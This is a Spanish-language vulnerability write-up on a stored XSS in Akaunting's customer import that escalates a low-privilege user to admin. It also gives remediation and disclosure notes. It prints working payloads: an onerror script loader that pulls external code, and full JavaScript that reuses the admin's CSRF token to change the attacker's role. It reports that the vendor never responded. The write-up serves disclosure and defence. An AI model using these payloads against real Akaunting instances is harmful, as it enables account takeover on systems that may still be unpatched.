Stored XSS to Admin_

CriticalStored XSS / Privilege escalationNo response
Source Code ReviewStored XSSPrivilege EscalationVue.jsLaravel

Durante una revisión de Akaunting encontré una cadena de stored XSS que comenzaba en la importación de clientes desde XLSX y terminaba ejecutando JavaScript en la sesión de un administrador.

Una cuenta sin privilegios administrativos, pero con permiso para crear o importar clientes, podía guardar un payload en un campo de dirección como city. Más adelante, cuando un administrador seleccionaba ese cliente durante la creación de una factura, Akaunting renderizaba contact.location mediante v-html y ejecutaba el contenido almacenado.

En mi laboratorio utilicé la ejecución same-origin para enviar una petición administrativa con la sesión y el token CSRF de la víctima. La prueba cambió mi propia cuenta de un rol limitado a Admin.

La reproducción se limitó a una instancia local construida desde el repositorio oficial. Los correos, nombres e identificadores de este artículo son datos sintéticos del laboratorio.

El límite de confianza que se rompía

Los campos city, state y zip_code son datos de dirección en texto plano. El propio backend documentaba esa expectativa:

// Keep formatted address as plain text. Views convert line breaks to <br> safely.

Sin embargo, el componente de contacto trataba la ubicación formateada como HTML confiable. El sink estaba en:

resources/assets/js/components/AkauntingContactCard.vue
<tr v-if="contact.location">
  <th
    class="font-normal text-sm ltr:text-left rtl:text-right p-0"
    v-html="contact.location"
  ></th>
</tr>

La directiva v-html no escapa el valor. Si una parte de contact.location contiene markup, Vue lo entrega al parser HTML del navegador.

Flujo vulnerable

La importación aceptaba el contenido de los campos de dirección y ese valor reaparecía después dentro de la ubicación del contacto:

XLSX controlado por un usuario de bajo privilegio
        ↓
campo city, state o zip_code
        ↓
cliente almacenado
        ↓
contact.location
        ↓
AkauntingContactCard.vue
        ↓
v-html
        ↓
JavaScript en la sesión del administrador

La cuenta atacante no necesitaba permisos de usuarios, roles o configuración. El administrador activaba la cadena durante una acción normal: seleccionar el cliente en el formulario de una factura.

Confirmación del stored XSS

Primero importé un XLSX cuyo campo city contenía un payload visible:

<img src=x onerror="alert('XSS contact.location: '+document.domain)">

El payload permaneció almacenado con el cliente. Al abrir el formulario de facturas y seleccionar ese contacto desde una sesión administrativa, el componente renderizó la ubicación y se ejecutó onerror.

La prueba confirmó cuatro propiedades:

  1. El payload entraba por el flujo normal de importación.
  2. Sobrevivía al almacenamiento y recuperación del cliente.
  3. La ejecución ocurría en una vista utilizada por administradores.
  4. El código se ejecutaba bajo el origen y la sesión de Akaunting.

Del XSS a la escalada de privilegios

El campo de dirección tenía una longitud limitada. Para demostrar impacto sin convertir el valor importado en un script extenso, utilicé un loader corto hacia un servidor del laboratorio:

<img src=x onerror="s=document.createElement('script');s.src='//127.0.0.1:9001/p.js';document.body.append(s)">

El archivo p.js preparaba la misma petición que utilizaría la interfaz administrativa para actualizar un usuario. Estos IDs pertenecían únicamente a la instancia local:

const attackerUserId = 2;
const adminRoleId = 1;
const companyId = 1;

const body = new URLSearchParams();
body.append("_method", "PATCH");
body.append("name", "Customer Importer");
body.append("email", "attacker@example.test");
body.append("landing_page", "dashboard");
body.append("enabled", "1");
body.append("roles", String(adminRoleId));
body.append("companies[]", String(companyId));

fetch(`/${companyId}/auth/users/${attackerUserId}`, {
  method: "POST",
  credentials: "same-origin",
  headers: {
    "X-CSRF-TOKEN": window.Laravel.csrfToken,
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: body.toString(),
}).then((response) => {
  console.log("role escalation status:", response.status);
});

El código no robaba credenciales. Se ejecutaba dentro del navegador del administrador y aprovechaba directamente su contexto autenticado. Por eso podía leer window.Laravel.csrfToken, enviar cookies same-origin y realizar una acción que la cuenta atacante no podía ejecutar por sí sola.

Reproducción en el laboratorio

Las precondiciones eran:

Víctima
- Cuenta Administrator

Atacante
- Cuenta autenticada sin privilegios administrativos
- Permiso para crear o importar clientes
- Sin permisos para administrar usuarios o roles

El procedimiento que seguí fue:

  1. Inicié sesión con la cuenta limitada.
  2. Abrí Sales → Customers → Import.
  3. Importé un cliente con el loader en el campo city.
  4. Serví p.js únicamente dentro de la red del laboratorio.
  5. Inicié sesión como administrador y abrí /<company_id>/sales/invoices/create.
  6. Seleccioné el cliente importado.
  7. El componente de contacto ejecutó el loader y la petición de actualización respondió HTTP 200.
  8. Cerré la sesión e inicié nuevamente como el atacante.
  9. La cuenta ya podía acceder a administración de usuarios y configuración de la compañía.

La transición observada fue:

attacker@example.test → customer-importer-limited
attacker@example.test → admin

La comprobación de base de datos confirmó el cambio de rol en la instancia local:

+----+-----------------------+---------+-----------+
| id | email                 | role_id | role_name |
+----+-----------------------+---------+-----------+
|  2 | attacker@example.test |       1 | admin     |
+----+-----------------------+---------+-----------+

Por qué el token CSRF no detenía el ataque

Un token CSRF protege contra peticiones iniciadas desde otro origen. No protege contra JavaScript que ya se ejecuta dentro del origen legítimo.

El stored XSS podía acceder a window.Laravel.csrfToken y enviar una petición con credentials: "same-origin". Desde la perspectiva del servidor, la solicitud provenía de la sesión administrativa y contenía el token esperado.

Impacto

La cadena permitía que un usuario de bajo privilegio escalara a administrador después de que una víctima administrativa seleccionara el cliente preparado.

El impacto que confirmé fue:

customer importer de bajo privilegio
        ↓
stored XSS mediante XLSX
        ↓
administrador selecciona el cliente
        ↓
JavaScript same-origin en la sesión administrativa
        ↓
actualización del rol del atacante
        ↓
acceso administrativo

Una vez elevado, el atacante podía acceder a funciones como administración de usuarios, configuración de compañías y otros recursos restringidos.

Severidad

Calculé las siguientes puntuaciones:

CVSS 3.1: 9.0 Critical
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L

CVSS 4.0: 8.4 High
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N

La interacción requerida está reflejada en ambos vectores: el administrador debe seleccionar el cliente malicioso. No hace falta que confirme una acción adicional ni que abra un adjunto.

Remediación

contact.location debe mantenerse como texto. El componente no necesita interpretar HTML para mostrar una dirección.

La solución preferida es retirar v-html y utilizar interpolación de Vue:

<th
  v-if="contact.location"
  class="whitespace-pre-line font-normal text-sm ltr:text-left rtl:text-right p-0"
>
  {{ contact.location }}
</th>

También aplicaría estas medidas:

  1. Validar los campos de dirección durante creación e importación como texto plano.
  2. Revisar todos los sinks v-html que reciban modelos de contacto, facturación o importaciones.
  3. Si alguna vista requiere HTML, sanitizarlo con una allowlist inmediatamente antes del sink.
  4. Añadir una CSP estricta como defensa en profundidad.
  5. Crear pruebas con payloads en city, state y zip_code tanto para formularios como para XLSX.

Codificar solo en la importación no sería suficiente si existen otras rutas para actualizar el contacto. La garantía principal debe estar en el punto de renderizado: los campos de dirección nunca deben convertirse en HTML activo.

Estado de divulgación

Contacté al equipo de seguridad y al maintainer con la reproducción y el impacto confirmado, pero no recibí respuesta. No tengo confirmación de un parche y no afirmo que la versión actual esté corregida.
